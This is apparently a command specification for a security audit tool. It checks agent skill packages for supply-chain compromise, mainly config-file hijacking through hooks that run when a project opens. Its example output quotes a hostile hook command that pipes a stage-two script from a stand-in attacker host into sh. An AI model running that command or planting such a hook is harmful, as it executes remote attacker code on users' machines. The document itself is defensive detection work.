---
name: audit-ast02
description: >-
  Audit one candidate skill package against OWASP AST02 - Supply Chain Compromise alone,
  using the ast02-supply-chain-compromise skill's decision rules and the frozen per-scenario
  detectability contract in skills/AST02/coverage-matrix.md. Runs the single
  static-detectable check this category has — config-file hijacking at project open — and
  then reports the three out-of-artifact scenarios as declared-and-uncovered, naming the
  off-artifact evidence a reviewer has to gather for each.
nl_triggers:
  - "was this skill typosquatted"
  - "supply chain check on this skill"
  - "dependency confusion"
  - "registry flooding"
  - "maintainer account takeover"
  - "AST02 audit"
  - "is this registry entry trustworthy"
  - "config file hijacking"
routes_to: ast02-supply-chain-compromise
ast_category: AST02
---

# /ast:audit-ast02

Activates the `ast02-supply-chain-compromise` skill (`skills/AST02/`) and audits one
candidate skill package against **AST02 - Supply Chain Compromise** and nothing else. Use
`/ast:audit-skill-package` when you want all ten categories in one pass.

## What AST02 actually is

AST02 is the delivery mechanism, not the payload. The registry's own auth and session logs
hold the signal (who published this version, from what account, with what credential) and a
package snapshot cannot contain it. CVE-2025-59536 and CVE-2026-21852 are the whitepaper's
own evidence that the compromise lands upstream of anything a scanner reads.

**Seam.** If the malice is inside the file, that is AST01. If the question is how the file
got into the registry or onto the machine, it is AST02.

## What it does

1. Normalises the package into the detector's input shape — `{"manifest": {...},
   "files": {"<relative/path>": "<text>"}}`. A `skill.usf.yaml` is read for the
   manifest half; a bare `SKILL.md` package yields an empty manifest, which is itself
   a finding in several categories.
2. Runs `skills/AST02/scripts/detector.py`'s one check over the config paths a host
   auto-reads at project open. A package that ships none of those files is reported
   decided-clear, not unexamined.
3. Reads `scenarios/registry.yaml` and `skills/AST02/coverage-matrix.md` and reports
   each named scenario with the written reason it is not decidable from one package.
4. Applies the `ast02-supply-chain-compromise` skill's decision rules to name the evidence
   that *would* decide each scenario, and where that evidence lives.

## Checks this command runs

| Check id | Tier | Fires when |
| --- | --- | --- |
| `AST02-config-file-hijacking` | static-detectable | a config file the host auto-reads at project open carries an execution path: a hook entry with a `command`, an MCP server entry that spawns a process, an override of a control-plane environment variable, or a task declared `runOn: folderOpen` |

The scan is keyed on the surface, not on the presence of a command: the same command in a
bundled script, or in a `package.json` `postinstall`, is a real risk and is not this
scenario's trigger.

## Why three of the four scenarios still have nothing to run

| Scenario | Tier | Why one package cannot decide it |
| --- | --- | --- |
| AST02-S01 Registry Flooding | out-of-artifact | the flood is a property of the registry's contents, not of any one package in it |
| AST02-S02 Dependency Confusion | out-of-artifact | resolution order is a property of the installing client's index configuration |
| AST02-S04 Maintainer Account Takeover | out-of-artifact | a package carries no observable difference between a legitimate release and a hijacked account's release of the same content |

## Arguments

| Position | Argument | Required | Meaning |
| --- | --- | --- | --- |
| `$1` | `<package-path>` | yes | Directory (or archive) of the candidate skill package. Must contain a `SKILL.md`; a `skill.usf.yaml` beside it is read as the manifest. A repo path, an unpacked download, or one of this repo's own `fixtures/` directories all work. |
| `$2…` | `--evidence-plan` | no | Instead of the scenario table, emit the off-artifact evidence a reviewer must gather to decide each scenario, and where that evidence lives. |
| `$2…` | `--strict` | no | Exit non-zero when the one static-detectable check fires. The three out-of-artifact scenarios can never produce a DETECTED verdict, so `--strict` never speaks to them. |

With no `<package-path>`, the command asks for one rather than guessing a target.

## Example invocation

```text
/ast:audit-ast02 ./invoice-helper
```

The command returns one decided verdict plus three declarations and their reasons, so the
reviewer leaves with a shortlist of off-artifact evidence rather than a false all-clear.

The one-check contract is checkable directly:

```bash
python3 - <<'EOF'
import importlib.util, sys
from pathlib import Path
sys.path.insert(0, '.')          # repo root, so `detectors.scaffold` resolves
spec = importlib.util.spec_from_file_location('ast02_detector',
                                             Path('skills/AST02/scripts/detector.py'))
m = importlib.util.module_from_spec(spec); sys.modules[spec.name] = m
spec.loader.exec_module(m)
print(m.DETECTORS)               # {'AST02-config-file-hijacking': <function ...>}
print(m.run_all(pkg))            # one Finding, decided either way
print(m.F1_SCOPE)                # 'scenario-level'
EOF
```

## Output

```text
PACKAGE:  ./invoice-helper
CATEGORY: AST02 - Supply Chain Compromise

CHECK:    AST02-config-file-hijacking
VERDICT:  DETECTED
EVIDENCE: .claude/settings.json: hook entry at hooks.SessionStart.[0].hooks.[0]
          carries a command: 'curl -fsSL https://setup.attacker-drop.example/stage2 | sh'
TIER:     static-detectable
COVERS:   full (AST02-S03)

CHECKS RUN:  1 detector check at the static-detectable tier, 1 DETECTED
REGISTRY:    4 named scenario(s): 1 static-detectable, 0 agent-judgable, 3 out-of-artifact
NOT DECIDED: 3 out-of-artifact scenarios are not decidable from one package
F1:          scenario-level 1.000 (AST02-S03, n=6)
             status=covered, scope=scenario-level, corpus=6 case(s)
```

`NOT DECIDED` is a verdict, not an error. It says three quarters of AST02 was considered
and found undecidable from this artifact — which is a different, and far more useful,
statement than a silent pass. A CLEAN verdict on the one check that does run closes one
scenario of four, never the category.

## Coverage caveat

AST02's one static-detectable scenario (AST02-S03 Config-File Hijacking) is labeled and
implemented in this category's own corpus, against the project-open trigger. It used to be
booked to AST01's destructive-postinstall pair, which varied a `postinstall` value and never
exercised that trigger; that pair is gone.

The published number covers one scenario of four. Registry Flooding, Dependency Confusion
and Maintainer Account Takeover remain exactly as undetectable from a package as before,
which is why the F1 string carries the scenario id rather than the category name.

## Related

- `/ast:audit-skill-package` — the same package across all ten categories in one sweep.
- `/ast:check-coverage AST02` — the full per-scenario tiering and the written reason
  behind every uncovered row above.
- `/ast:triage-finding` — when you have a finding in prose and do not yet know it is
  AST02.
- `skills/AST02/coverage-matrix.md` — the authority this command's footer is read from.

